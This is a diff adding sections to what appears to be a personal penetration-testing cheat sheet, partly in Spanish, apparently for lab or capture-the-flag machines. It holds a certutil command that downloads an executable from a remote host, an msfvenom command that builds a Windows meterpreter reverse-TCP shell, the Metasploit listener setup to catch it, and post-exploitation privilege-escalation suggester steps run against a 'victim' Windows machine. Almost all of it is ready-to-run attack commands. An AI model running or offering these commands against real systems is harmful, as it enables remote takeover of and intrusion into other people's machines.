@@ -39,5 +39,57 @@ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -
 certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
 ```
 
+
+
+## PAYLOAD msfvenom
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f exe -o shell.exe
 ```
+
+
+### Listener
+
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.20
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+```
+
+
+## Modules
+
+
+
+```bash
+run post/multi/recon/local_exploit_suggester
+```
+
+
+
+
+
+## Windows-exploit-suggester
+
+
+tenemos que ejecutar primero esto en la maquina *windows* victima
+
+```cmd
+sysinfo
+```
+
+
+----------
+
+
+```bash
+python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
+```
+
+```bash
+/opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-13-mssb.xls --systeminfo sysinfo
 ```
